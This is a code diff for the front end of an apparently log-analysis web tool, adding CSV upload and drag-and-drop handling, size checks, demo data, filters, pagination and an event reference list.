-  const zone=els['drop-zone'];for(const type of ['dragenter','dragover'])zone.addEventListener(type,event=>{event.preventDefault();zone.classList.add('dragover');});for(const type of ['dragleave','drop'])zone.addEventListener(type,event=>{event.preventDefault();zone.classList.remove('dragover');});zone.addEventListener('drop',event=>{const file=event.dataTransfer.files?.[0];if(!file)return;const transfer=new DataTransfer();transfer.items.add(file);els['csv-file'].files=transfer.files;els['csv-file'].dispatchEvent(new Event('change',{bubbles:true}));});
+  els['csv-file'].addEventListener('change', async event => {
+    const file = event.target.files?.[0]; if (!file) return;
+    const token = ++ingestToken;
+    clearLoadedInput(file.name, 'Reading CSV…');
+    if (!file.name.toLowerCase().endsWith('.csv')) { setStatus('Please choose a file with a .csv extension.', true); return; }
+    if (file.size > 25 * 1024 * 1024) { setStatus('File exceeds 25 MB. Export a smaller time range.', true); return; }
+    try { const text = await file.text(); if (token === ingestToken) processText(text,file.name); }
+    catch { if (token === ingestToken) setStatus('This file could not be read.', true); }
+  });
+  document.querySelectorAll('[data-sample]').forEach(button => button.addEventListener('click', () => {
+    ingestToken += 1; const key = button.dataset.sample;
+    processText(makeCsv(sampleRows[key]),sampleNames[key] + ' · Demo Data'); document.querySelector('.demo-details').open = true;
+  }));
+  for (const id of filterIds) els[id].addEventListener('input', () => { page = 0; renderTable(); });
+  for (const id of Object.values(settingIds)) els[id].addEventListener('change', () => { settings(); if (!els.report.hidden) runAnalysis(); });
+  els['reset-settings'].addEventListener('click', () => {
+    for (const [key,id] of Object.entries(settingIds)) els[id].value = String(DEFAULT_SETTINGS[key]);
+    if (!els.report.hidden) runAnalysis();
+  });
+  els.findings.addEventListener('click', event => { const button = event.target.closest('[data-evidence]'); if (button) selectEvidence(button.dataset.evidence); });
+  els['event-rows'].addEventListener('click', event => { const button = event.target.closest('[data-finding-focus]'); if (button) focusFinding(button.dataset.findingFocus); });
+  els['evidence-back'].addEventListener('click', () => focusFinding(activeEvidenceId));
+  els['show-all-events'].addEventListener('click', () => { activeEvidenceId = null; resetFilters(); renderTable(); });
+  els['page-prev'].addEventListener('click', () => { page -= 1; renderTable(); });
+  els['page-next'].addEventListener('click', () => { page += 1; renderTable(); });
+  const zone = els['drop-zone'];
+  for (const type of ['dragenter','dragover']) zone.addEventListener(type, event => { event.preventDefault(); zone.classList.add('dragover'); });
+  for (const type of ['dragleave','drop']) zone.addEventListener(type, event => { event.preventDefault(); zone.classList.remove('dragover'); });
+  zone.addEventListener('drop', event => {
+    const file = event.dataTransfer.files?.[0]; if (!file) return;
+    const transfer = new DataTransfer(); transfer.items.add(file); els['csv-file'].files = transfer.files;
+    els['csv-file'].dispatchEvent(new Event('change', { bubbles: true }));
+  });
+  els['event-reference'].innerHTML = Object.entries(eventCatalog).map(([id,info]) =>
+    '<div><dt>' + id + '</dt><dd>' + escapeHtml(info.label) + '<details><summary>Logging and required context</summary><p>' +
+    escapeHtml(info.channel) + ' · ' + escapeHtml(info.audit) + '</p><p>' + escapeHtml(info.fields) + '</p></details></dd></div>').join('');
 })();
+
